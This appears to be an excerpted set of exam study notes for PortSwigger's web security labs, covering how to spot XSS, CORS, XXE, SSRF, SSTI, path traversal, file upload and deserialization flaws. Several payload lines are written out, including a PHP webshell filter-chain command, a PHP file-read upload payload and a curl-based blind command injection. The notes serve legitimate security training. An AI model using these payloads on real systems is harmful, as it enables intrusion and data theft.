...
> In the `source code` we _**identify**_ the call using `addEventListener` and an element id `ads` being referenced.
...
> Application controls give message, _**"Tag is not allowed"**_ when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](broken-reference). This payload steal my own session cookie as POC.
...
> The below response validate the _**identity**_ of GraphQL endpoint:
...
> Intercept the login POST request to the target. _**Identify**_ the GraphQL mutation contain the username and password.

> Copy the URL of the `/graphql/v1` POST request and past into the _**InQL Scanner**_ tab to scan API.
...
> Sending too many incorrect login attempts to the API, rate limit protection response message response is _**identified**_.
...
[Trusted insecure protocols](broken-reference)\
[Null origin trusted](broken-reference)

#### Trusted insecure protocols

> _**Identify**_ in the `source code` the account details are requested with AJAX request and it contains the user session cookie in the response.
...
> Place code in the exploit server body and **Deliver exploit to victim** to steal the AJAX session token and API key. In the BSCP exam use the [CORS](broken-reference) vulnerability to steal JSON data that also include the administrator session token, and can be used to escalate privilege.
...
[XXE Identify](broken-reference)\
[XXE Xinclude file read](broken-reference)\
[XXE DTD Blind Out-of-band](broken-reference)\
[XXE DTD Blind Error messages](broken-reference)\
[XXE SQLi inside XML + HackVertor](broken-reference)\
[XXE perform SSRF](broken-reference)\
[XXE with SVG upload](broken-reference)\
...
> To _**Identify**_ XXE in not so obvious parameters or requests, require adding the below and URL encode the **&** ampersand symbol to see the response.
...
> **Rabbit hole:** The submit feedback and screenshot upload on feedback is not to be followed by _**Neo**_ down the Matrix.
...
> **Rabbit hole:** The submit feedback and screenshot upload on feedback is for _**Neo**_ to follow _**Trinity**_ in the Matrix.

#### SQL + XML + HackVertor

> The combination of vulnerabilities are _**identified**_ in a XML Post body and inserting mathematical expression such as **7x7** into field and observing the evaluated value. Using this type of XML and SQL injection with WAF filter bypass via encoding may allow extract of sensitive data.
...
> Bypass the WAF, Use Burp extension [**Hackvertor**](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) to [obfuscate](broken-reference) the SQL Injection payload in the XML post body.
...
[SSRF blacklist filter](broken-reference)\
[SSRF via Absolute GET URL + HOST Header](broken-reference)\
[SSRF inside XXE](broken-reference)\
[SSRF HOST Routing-based](broken-reference)\
[SSRF inside HTML-to-PDF](broken-reference)\
[SSRF Open Redirection](broken-reference)\
[SSRF Consecutive Connection State](broken-reference)
...
> POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect\_uris array containing an arbitrary white-list of callback URIs. Observe the redirect\_uri.
...
> _**Identify**_ routing-based SSRF by altering the **host** header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost Intranet.
...
> The target make **GET** request to the _**next product**_ on the e-commerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. See product page `source code` below.

> The _**identification**_ of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.
...
[SSTI Identified](broken-reference)\
[Tornado](broken-reference)\
[Django](broken-reference)\
[Freemarker](broken-reference)\
[ERB](broken-reference)\
[Handlebars](broken-reference)

> Use the web framework native template syntax to inject a malicious payload into a **\{{input\}}**, which is then executed server-side. Submitting invalid syntax will often result in error message that lead to _**identifying**_ the template framework. Use PortSwigger [template decision tree](https://portswigger.net/web-security/images/template-decision-tree.png) to aid in _**identification**_.
...
> SSTI payloads to manually _**identify**_ vulnerability.
...
> _**Identification**_ of tornado template framework after testing injection with `}}{{ 7*7}}`.

> Tornado Template can be _**identified**_ using a `}}{{ 7*7}}` payload that breakout of current expression and evaluate `7*7`.
...
Use fuzzer payload to produce error message that _**identify**_ handlebars template engine.
...
> Note: _**Identify**_ the Update forgot email template message under the admin\_panel at the path /update\_forgot\_email.
...
[LFI Attacks](broken-reference)\
[Admin Portal Files](broken-reference)\
[Path Traversal Authz](broken-reference)
...
> _**Identify**_ web parameters such as `filename=` that are requesting files from target.
...
7. Windows OS accept both `../` and `..\` for directory traversal syntax, and as example retrieving `loadImage?filename=..\..\..\windows\win.ini` on windows target to _**identify**_ valid path traversal.
8. [PHP Wrapper, expect & filter](https://github.com/botesjuan/cpts-quick-references/blob/main/module/File%20Inclusions.md#remote-code-execution) pose vulnerability that allow traversal bypass to result in remote code execution (RCE) critical. Using [PHP filter chain generator](https://github.com/synacktiv/php\_filter\_chain\_generator) to get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP! See [Tib3rius YouTube demo](https://youtu.be/OGjpTT6xiFI?t=1019) ``python php_filter_chain.generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1 | urlencode``
...
> BSCP Exam challenge _**identified**_, after obtaining admin session access, you can read `/etc/passwd` and `/etc/hostname` but as soon using same bypass file path traversal technique, the `home/carlos/secret` give response `403 Forbidden`.

#### Admin Portal Files

> On the admin portal _**identify**_ that the images are loaded using **imagefile=** parameter. Test if vulnerable to directory traversal. The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.
...
> Note: Add the fuzzing path traversal payload from drop-down list option, _**Add from list ...**_. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex `\{FILE\}` for each of the attacks.
...
[Bypass Upload Controls](broken-reference)\
[XXE via SVG Image upload](broken-reference)\
[Remote File Inclusion](broken-reference)\
[XSS SVG Upload](broken-reference)\
[Race Condition Web shell upload](broken-reference)\
...
> _**Identify**_ any type of file upload function.
...
6. If target allow [Remote File Include](broken-reference) (RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: `GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>`. The file name on exploit server could read `image.php%00.gif`.
...
> _**Identify**_ image upload on the blog post function that accept **svg** images, and observe that the avatars already on blog `source code` is **svg** extensions.
...
> Below scenario could be exploited using [SSRF](broken-reference) or RFI. Did not solve this challenge.....
...
> Image upload function _**identified**_ on profile page.

> White box penetration test scenario, the vulnerable _**source code**_ that introduces this race condition is supplied by the client for the target:
...
> Right-click on the failed upload `POST /my-account/avatar` request that was used to submit the PHP Payload file upload and select _**Extensions > Turbo Intruder > Send to turbo intruder.**_ The Turbo Intruder window opens. Copy and paste the following race condition inducing script template into Turbo Intruder's Python editor:
...
[CustomTemplate PHP](broken-reference)\
[Burp Deserialization Scanner](broken-reference)\
[YsoSerial](broken-reference)\
[SHA1 HMAC Symfony](broken-reference)

#### CustomTemplate PHP

> Reading page `source code` and noticing comment mentioning , this _**identify**_ possible PHP framework and the Burp scanner _**identify**_ serialized session cookie object after we logged in with stolen `wiener:peter` credentials.

> Reviewing PHP `source code` by adding tilde _**\~**_ character at end of GET request `https://target.net/libs/CustomTemplate.php~`, we notice the **destruct** method.
...
> Make new PHP serial CustomTemplate object with the **lock\_file\_path** attribute set to **/home/carlos/morale.txt**. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the length.
...
> **IMPORTANT:** If you get error message when executing `java -jar ysoserial <Payload>` saying something in lines of _**java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets**_, the switch to alternative Java on Linux with following commands.
...
> _**Identify**_ that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for `/cgi-bin/phpinfo.php`, revealing the digital signature to sign new token. Sending invalid cookie session value the error reveals, `Symfony Version: 4.3.6`.

> **Note:** In BSCP exam not going to run this as it delete the file, but in exam read `source code` to _**identify**_ the `unserialize()` PHP function and extract content out-of-band using `PHPGGC`.
...
* [Output redirection](broken-reference)
...
> The target application **submit feedback** function require email value, and _**identifying**_ blind OS command injection by appending `||curl COLLABORATOR.net||` bash command, we then can observe a request made to Collaborator.
...
> If OS command injection _**identified**_, and filter in place preventing complex command injection, attempt to redirect output to writable folder. _**Identify**_ a [path traversal](broken-reference) vulnerability that allow reading of files only in current WEB APP.
...
> This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and [Obfuscation](broken-reference) techniques to bypass filters.

[Obfuscation](broken-reference)\
[Python Scripts](broken-reference)\
[Focus Scanning](broken-reference)\
[Approach](broken-reference)\
[YouTube & Extra Training Content](broken-reference)\
...
> HTML encode one or more of the characters. In video by [z3nsh3ll: Payload obfuscation with HTML encoding](https://youtu.be/-4ia\_L-uLGY) he explain post analysis of the lab Stored XSS into `onclick` event.
...
> Python script to [_**identify**_](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify) vulnerabilities in the exam and provide indicators of exploits.

[Python Script to _**identify**_ possible vulnerabilities in headers, cookies or the response body](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify)
...
> The image below is my view of possible vulnerabilities _**identified**_ and exploitation to reach the next BSCP exam stage and progress through the exam challenges.\
...
[![Passed BSCP Exam Stages](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/3stages.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/extras)

### Extra Training Content

> Some great links to YouTube content creators training material and links to study stuff.

* [My YouTube BSCP Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg\_YkVMP6PybE7I-hAdhR7adem)
* [Cookies, Sessions, JSON Web Tokens (JWT) Explained](https://youtu.be/uXDnS5PcjCA)

Youtube Information Security content creators channels (_**in no particular order**_):
